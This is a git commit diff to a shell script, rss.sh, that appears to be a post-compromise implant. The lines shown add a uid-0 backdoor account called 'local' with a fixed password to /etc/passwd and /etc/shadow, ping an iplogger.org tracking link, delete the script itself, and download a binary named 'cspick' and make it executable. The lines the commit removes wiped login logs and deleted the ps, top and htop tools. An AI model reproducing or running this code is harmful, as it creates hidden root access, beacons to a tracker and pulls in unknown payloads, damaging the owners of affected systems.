f10a2117162ab27c4b4f9f9845ed6ace93ea2a11
Alemalakraa <109798857+Alemalakraa@users.noreply.github.com>
2022-07-24 20:53:44 +0300

    Update rss.sh

--- rss.sh
+++ rss.sh
@@ -6,14 +6,7 @@ echo 'local:x:0:0:local:/root:/bin/bash' >> /etc/passwd
 echo 'local:123:18020:0:99999:7:::' >> /etc/shadow
 echo 'local:free08' | chpasswd
 wget --delete-after -q --no-check-certificate https://iplogger.org/2fE227 >/dev/null 2>&1; 
-rm -rf  /var/log/wtmp    
-rm -rf  /var/run/utmp    
-rm -rf  /var/log/btmp 
-rm -rf  /var/log/lastlog
-rm -rf /usr/bin/ps
-rm -rf /usr/bin/top
-rm -rf /usr/bin/htop
-rm -rf  rss.sh
+rm -rf rss.sh
 rm -rf cspick
 wget -q --no-check-certificate https://github.com/Alemalakraa/sd/raw/main/cspick
 chmod 777 cspick
